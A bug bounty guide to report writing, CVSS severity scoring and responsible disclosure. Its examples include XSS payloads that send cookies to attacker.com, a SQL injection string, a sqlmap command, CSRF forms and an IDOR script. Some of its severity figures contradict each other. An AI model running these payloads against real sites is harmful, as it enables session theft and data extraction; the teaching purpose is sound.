# Bug Report Writing & Disclosure Guide
> Sources: Bug Bounty Bootcamp (Li), Real-World Bug Hunting (Yaworski)

## Table of Contents
1. [The 8-Component Report Template](#1-the-8-component-report-template)
2. [Title Formulas](#2-title-formulas)
3. [Severity Assessment (CVSS v3.1)](#3-severity-assessment-cvss-v31)
4. [Writing an Effective PoC](#4-writing-an-effective-poc)
5. [Report Examples by Vulnerability Type](#5-report-examples-by-vulnerability-type)
6. [Disclosure Etiquette & Communication](#6-disclosure-etiquette--communication)
7. [Common Mistakes to Avoid](#7-common-mistakes-to-avoid)
8. [Triage Workflow](#8-triage-workflow)

---

## 1. The 8-Component Report Template

```
TITLE: [Severity] [Vulnerability Type] in [Component/Feature] Leads to [Impact]
Examples:
- [Critical] Stored XSS in Profile Bio Allows Attacker to Hijack Admin Sessions
- [High] SSRF in Image Import Feature Allows Access to AWS IAM Credentials
- [High] IDOR in /api/invoices Allows Authenticated Users to Read Any Invoice
- [Critical] SQLi in search Parameter Allows Database Credential Extraction

---

1. SUMMARY (2-4 sentences)
Brief description: what it is, where it is, what an attacker can do.
"There is a stored XSS vulnerability in the user profile bio field. An attacker who
submits a crafted profile bio can execute arbitrary JavaScript in the context of any
user who views the profile. This can be used to steal session cookies and take over
victim accounts."

2. VULNERABILITY DETAILS
- Vulnerability class (XSS, SQLi, IDOR, SSRF, etc.)
- Affected endpoint/feature
- Parameter/field name
- Root cause (brief, without suggesting fix yet)

3. SEVERITY
- Rating: Critical / High / Medium / Low / Informational
- CVSS v3 score: X.X (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)
- Justification for severity rating

4. STEPS TO REPRODUCE (numbered, exact)
1. Log in to https://target.com with account: attacker@example.com
2. Navigate to Settings → Profile
3. In the "Bio" field, enter: <script>fetch('https://attacker.com/?c='+document.cookie)</script>
4. Click "Save Profile"
5. Log in with a second account: victim@example.com
6. Navigate to https://target.com/user/attacker_username
7. Observe: the attacker's server receives the victim's session cookie

5. PROOF OF CONCEPT (PoC)
[HTTP request/response pairs, screenshots, video, or code]
Include:
  - Exact HTTP request that triggers the vulnerability
  - Server response demonstrating exploitation
  - Screenshot or video showing impact
  - Use alert(document.domain) or alert(document.cookie) — NOT just alert(1)

6. IMPACT
Concrete description of what an attacker can do:
"An attacker who exploits this vulnerability can:
- Steal session cookies of any user who views the malicious profile
- Take over victim accounts without their knowledge
- Execute actions on behalf of victims (changing email, password, making purchases)
- If an admin views the profile, admin-level account takeover is possible"

7. AFFECTED SCOPE
- Which environments (prod, staging)?
- All users affected? Specific roles?
- Estimated number of affected users

8. RECOMMENDED REMEDIATION
Specific fix, not just "sanitize input":
"Implement output encoding (HTML entity encoding) on the bio field before rendering
to HTML. Use a Content Security Policy to prevent inline script execution.
Consider using DOMPurify for cases where HTML is intentionally allowed."
```

---

## 2. Title Formulas

```
# Format:
[VULN TYPE] in [COMPONENT] allows [ATTACK IMPACT]

# Examples:
Stored XSS in user profile bio allows account takeover of any viewer
IDOR in /api/orders endpoint exposes all customers' order history
SQL Injection in search parameter allows database credential extraction
SSRF via image URL fetch reaches AWS metadata endpoint exposing IAM credentials
OAuth CSRF via missing state parameter allows account takeover
JWT alg:none accepted — arbitrary user impersonation without valid credentials
```

---

## 3. Severity Assessment (CVSS v3.1)

### Scoring Factors

**Attack Vector (AV)**: N=Network (0.85) | A=Adjacent (0.62) | L=Local (0.55) | P=Physical (0.2)
**Attack Complexity (AC)**: L=Low (0.77) | H=High (0.44)
**Privileges Required (PR)**: N=None (0.85) | L=Low (0.62) | H=High (0.27)
**User Interaction (UI)**: N=None (0.85) | R=Required (0.62)
**Scope (S)**: U=Unchanged | C=Changed
**Confidentiality (C)**, **Integrity (I)**, **Availability (A)**: N=None (0) | L=Low (0.22) | H=High (0.56)

### Common Vulnerability CVSS Scores

| Vulnerability | CVSS Vector | Score | Severity |
|---|---|---|---|
| Unauthenticated RCE | AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H | 10.0 | Critical |
| Auth bypass → admin | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | 9.8 | Critical |
| SQLi → DB dump | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N | 7.5 | High |
| SSRF → AWS metadata | AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N | 8.5 | High |
| Stored XSS on sensitive page | AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N | 8.7 | High |
| IDOR → data read | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N | 6.5 | Medium |
| CSRF on state change | AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N | 6.5 | Medium |
| Reflected XSS | AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N | 6.1 | Medium |
| Open redirect | AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N | 6.1 | Medium |
| Clickjacking | AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N | 4.3 | Medium |
| Self-XSS | AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N | 3.5 | Low |
| Version disclosure | AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N | 5.3 | Low |
| Missing HSTS | AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N | 3.7 | Low |

### Quick Severity Reference
```
Critical (9.0-10.0):
  - RCE on server
  - Authentication bypass affecting all users
  - Mass data exfiltration of sensitive PII
  - Complete account takeover without user interaction

High (7.0-8.9):
  - Authenticated RCE / SSRF to AWS metadata
  - Stored XSS stealing session cookies
  - SQLi with data extraction
  - Account takeover requiring some user interaction
  - IDOR allowing mass user data access

Medium (4.0-6.9):
  - CSRF on sensitive actions
  - Reflected XSS requiring user to click link
  - IDOR affecting single user
  - Open redirect + phishing potential
  - Missing rate limiting on auth endpoints

Low (0.1-3.9):
  - Self-XSS (affects only own account)
  - Clickjacking on low-sensitivity pages
  - Open redirect (standalone, no chain)
  - Minor information disclosure

Informational (0.0):
  - Missing security headers (X-Frame-Options, HSTS, etc.)
  - Version disclosure in headers
  - Non-exploitable information
```

### Severity Escalation Factors
- No authentication required → +1 severity tier
- No user interaction required → higher
- Stored/persistent vs. reflected → stored is higher
- Affects many users, not just self → higher
- Affects sensitive data (PII, financial, credentials) → higher
- Can lead to full account takeover → high/critical
- Affects admin/privileged accounts → higher
- Chained with another vulnerability → escalate both

---

## 4. Writing an Effective PoC

### HTTP Request/Response Format
```
REQUEST:
GET /api/invoices/123/download HTTP/1.1
Host: target.com
Cookie: session=attacker_session_cookie

RESPONSE:
HTTP/1.1 200 OK
Content-Type: application/pdf

[Binary PDF data — note: this is VICTIM user 456's invoice, not attacker's]
```

### Screenshot Standards
- Use browser developer tools to show request and response
- Annotate with red arrows/boxes highlighting the vulnerability
- Show account context (which user is performing action, which user's data is accessed)
- For XSS: show `alert(document.domain)` or `alert(document.cookie)` — NOT just `alert(1)`

### Video PoC Format
- Show full attack chain, not just the end result
- Include: setup (two accounts if needed) → attack steps → result
- Narrate or add text captions
- Keep concise (2-5 minutes max)

### Code PoC
```python
# Example Python PoC for IDOR
import requests

attacker_session = 'attacker_session_cookie_here'
victim_invoice_id = 456

response = requests.get(
    f'https://target.com/api/invoices/{victim_invoice_id}/download',
    cookies={'session': attacker_session}
)

if response.status_code == 200:
    print(f"[+] IDOR Confirmed! Got victim's invoice ({len(response.content)} bytes)")
    with open('stolen_invoice.pdf', 'wb') as f:
        f.write(response.content)
else:
    print(f"[-] Request failed: {response.status_code}")
```

### CSRF PoC Template
```html
<!-- CSRF PoC - Changes victim email to attacker@evil.com -->
<html>
<body onload="document.forms[0].submit()">
  <form action="https://target.com/settings/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="csrf_token" value="">
  </form>
</body>
</html>
```

### JSON CSRF PoC (when server accepts text/plain)
```html
<html>
<body>
  <form action="https://target.com/api/action" method="POST" enctype="text/plain">
    <input name='{"action":"delete","user":"victim"}' value="">
  </form>
  <script>document.forms[0].submit()</script>
</body>
</html>
```

---

## 5. Report Examples by Vulnerability Type

### IDOR Report Example
```
Title: [High] IDOR in GET /api/users/{id}/profile Allows Unauthenticated PII Access

Summary:
The GET /api/users/{id}/profile endpoint does not verify that the requesting user
is authorized to view the specified profile. By changing the {id} parameter to any
valid user ID, an attacker can retrieve full profile data including name, email, phone,
and billing address.

Severity: High (CVSS 7.5 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

Steps to Reproduce:
1. Create an account: attacker@example.com (assigned user_id=1000)
2. Log in and retrieve auth token
3. Make the following request:

REQUEST:
GET /api/users/1001/profile HTTP/1.1
Host: target.com
Authorization: Bearer attacker_token_here

RESPONSE:
HTTP/1.1 200 OK
{"id":1001,"name":"Victim User","email":"victim@example.com","phone":"555-1234","address":"123 Main St"}

Impact: Enumerate all user IDs and exfiltrate PII of all registered users.
Remediation: Verify authenticated user's ID matches requested profile ID server-side.
```

### XSS Report Example
```
Title: [High] Stored XSS in Product Review Comment Allows Session Hijacking

Summary:
The product review comment field accepts and stores unsanitized HTML/JavaScript. When
any user views the product page, the stored script executes in their browser, allowing
theft of session cookies and account takeover.

Severity: High (CVSS 8.0 — AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N)

Steps to Reproduce:
1. Log in as attacker, navigate to any product page
2. Submit a review with the following in the comment field:
   <script>new Image().src='https://attacker.com/?c='+document.cookie</script>
3. Log in as victim, navigate to the same product page
4. Check attacker's server logs — victim's session cookie is received

Impact: Any user viewing the affected product page has their session cookie stolen.
Remediation: HTML entity encode all user-generated content before rendering.
```

### SQLi Report Example
```
Title: [Critical] SQL Injection in search Parameter Allows Database Credential Extraction

Severity: Critical (CVSS 9.8)

Steps to Reproduce:
1. Navigate to target.com/search
2. Enter search term, intercept in Burp Suite
3. Modify q parameter to: test' UNION SELECT NULL,NULL,username,password,NULL FROM users-- -
4. Response includes usernames and password hashes

Automated verification: sqlmap -u "https://target.com/search?q=test" --dbs

Impact: Complete extraction of all usernames and password hashes.
Remediation: Use parameterized queries (prepared statements) for all database queries.
```

---

## 6. Disclosure Etiquette & Communication

### Responsible Disclosure Process
1. Confirm the vulnerability is real, in scope, and reproducible
2. Prepare a clear report with all reproduction details
3. Submit via proper channel (HackerOne, Bugcrowd, security@company.com, security.txt)
4. Wait for initial response (standard: 7-14 days)
5. Follow up politely after 7 days if no response
6. Allow fix time — standard: 90 days (Google Project Zero standard)
7. Disclose after fix or after 90 days with notice

### Communication Best Practices
```
DO:
✓ Be professional and respectful at all times
✓ Include enough detail to reproduce without back-and-forth
✓ Accept triage decisions graciously (you can appeal professionally)
✓ Acknowledge when a finding is informational/lower severity
✓ Update the report if you find additional impact
✓ Celebrate the security team's quick fixes (positive reinforcement)

DON'T:
✗ Threaten public disclosure to pressure faster payment
✗ Access data beyond what's needed to prove the vulnerability
✗ Test production when staging is available
✗ Run automated scanners without explicit permission
✗ Submit findings you can't reproduce
✗ Be aggressive in triage disputes
✗ Publicly disclose before the fix is deployed
```

### Handling Triage Disputes
```
If you disagree with severity rating:
1. Wait 1-2 days before responding (avoid emotional reactions)
2. Re-read the program policy — they may have different severity definitions
3. Respond professionally with additional context:
   "Thank you for triaging this. I'd like to provide additional context
   on the impact. [Additional details]. Given [reason], I believe this
   warrants High severity. Would you be open to reconsidering?"
4. Provide a more compelling PoC if possible
5. Accept graciously if still disagreed

If marked as duplicate:
"Thank you. Could you share the date of the original report?
I'm happy to close this out." (May still get partial bounty for independent discovery)
```

---

## 7. Common Mistakes to Avoid

### In Testing
```
✗ Not fully understanding the application before testing
✗ Submitting a finding that's actually by design
✗ Not testing all HTTP methods for each vulnerability
✗ Forgetting to test the API alongside the web app
✗ Missing vulnerabilities due to not testing all user roles
✗ Relying solely on automated scanning
✗ Not trying to chain low-severity findings into higher severity
✗ Giving up too quickly on a potential finding
✗ Testing out-of-scope assets
✗ Causing service disruption (DoS, heavy scanning)
```

### In Reports
```
✗ Unclear reproduction steps (can't reproduce = won't pay)
✗ Using alert(1) instead of demonstrating real impact
✗ No screenshots or HTTP requests
✗ Claiming Critical for self-XSS
✗ Inflating severity without justification
✗ Submitting theoretical vulnerabilities without proof
✗ Missing the impact section
✗ Not updating the report when you find additional impact
✗ Submitting duplicates of known issues
```

---

## 8. Triage Workflow

### Self-Triage Checklist Before Submission
```
[ ] Is this in scope per the program policy?
[ ] Have I confirmed this is reproducible (tried 3+ times)?
[ ] Is the impact clearly demonstrated (not just theoretical)?
[ ] Have I tried to maximize impact (chained vulnerabilities, full ATO)?
[ ] Is this a known/previously reported class of finding?
[ ] Have I looked at disclosed reports for this program?
[ ] Is the severity rating defensible?
[ ] Are the reproduction steps clear for someone unfamiliar with the app?
[ ] Have I included all relevant HTTP request/response pairs?
[ ] Have I included screenshots or video?
[ ] Does the report include recommended remediation?
[ ] Have I spell-checked and proofread?
```

### Priority Submission Order
1. Critical vulnerabilities (RCE, auth bypass, mass data breach) → submit within 24 hours
2. Subdomain takeover → submit quickly (others might claim it)
3. High-impact data breaches (PII, financial, credentials)
4. Race conditions where you've demonstrated impact
5. Then work down severity tiers

### Triage Timeline Expectations

| Response Type | Typical Timeframe |
|---|---|
| First response from triage | 1-7 days |
| Validity determination | 1-14 days |
| Severity assignment | 1-14 days |
| Fix deployment | 30-90 days |
| Bounty payment | After fix, 7-30 days |
| Public disclosure | 90 days after report (Project Zero standard) |

### Building Your Portfolio
- HackerOne / Bugcrowd: disclosed reports are public, great for portfolio
- Blog: write-ups after public disclosure
- GitHub: store non-sensitive PoC code
- LinkedIn: link to disclosed reports
